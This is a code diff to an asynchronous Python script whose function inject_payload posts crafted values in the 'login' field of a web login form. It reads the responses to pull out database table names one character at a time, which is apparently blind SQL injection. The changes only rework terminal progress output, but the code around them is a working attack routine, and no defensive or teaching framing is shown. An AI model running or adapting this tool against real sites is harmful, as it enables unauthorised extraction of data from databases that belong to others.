@@ -25,15 +25,22 @@ async def inject_payload(session, data):
             injectable_data = aiohttp.FormData()
             injectable_data.add_field("login", post_payload_table_name)
             injectable_data.add_field("pass", "whatever")
-            async with session.post(cfg.usr_url, data=injectable_data, headers=cfg.headers) as response:
-                sys.stdout.write("\033[s\n")
-                response_text = await response.text()
-                print(f"[*] payload: [{data['letter_position']}]: {data['operator']}'{data['char']}' || status: {response.status}")
-                sys.stdout.flush()
 
-                sys.stdout.write("\033[u")
-                sys.stdout.write(f"\033[2K\r[+] table name: {data['general_name']}| offset [{data['offset']}]")
-                #return response.status == cfg.true_code
+            async with session.post(cfg.usr_url, data=injectable_data, headers=cfg.headers) as response:
+                #sys.stdout.write("\033[s\n")
+                response_text = await response.text()
+                #print(f"[*] payload: [{data['letter_position']}]: {data['operator']}'{data['char']}' || status: {response.status}")
+                #sys.stdout.flush()
+                #sys.stdout.write("\033[u")
+                #sys.stdout.write(f"\033[2K\r[+] table name: {data['general_name']}| offset [{data['offset']}]")
+                ####
+                sys.stdout.write("\033[2K\r")
+                sys.stdout.write("\033[F")
+                sys.stdout.write("\033[2K")
+                sys.stdout.write(f"[*] retrieve: {data['general_name']} | offset [{data['offset']}] || {response.status}    \n")
+                sys.stdout.write("\033[2K\r")
+                sys.stdout.write(f"[*] payload[{data['letter_position']}]: {data['operator']}'{data['char']}'")
+                sys.stdout.flush()
                 if not re.search(r"\[null\]", response_text):
                     return response_text
         except Exception as e:
@@ -85,8 +92,8 @@ async def inject_payload(session, data):
                 sys.stdout.write(f"[*] retrieve: {data['general_name']} | offset [{data['offset']}] || {response.status}    \n")
                 sys.stdout.write("\033[2K\r")
                 sys.stdout.write(f"[*] payload[{data['letter_position']}]: {data['operator']}'{data['char']}'")
-                #sys.stdout.write("\033[F")
                 sys.stdout.flush()
+                #sys.stdout.write("\033[F")
                 #sys.stdout.write("\033[s")
                 #sys.stdout.write("\033[u")
                 return response.status == cfg.true_code
